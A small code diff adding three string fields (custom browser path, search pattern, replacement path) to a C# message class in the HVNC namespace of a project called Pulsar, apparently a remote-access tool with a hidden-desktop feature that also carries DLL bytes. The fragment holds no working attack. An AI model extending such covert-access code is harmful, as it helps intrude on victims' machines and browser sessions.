@@ -15,5 +15,11 @@ namespace Pulsar.Common.Messages.Monitoring.HVNC
         public bool DontCloneProfile { get; set; }
         [Key(4)]
         public byte[] DllBytes { get; set; }
+        [Key(5)]
+        public string CustomBrowserPath { get; set; }
+        [Key(6)]
+        public string CustomSearchPattern { get; set; }
+        [Key(7)]
+        public string CustomReplacementPath { get; set; }
     }
 }
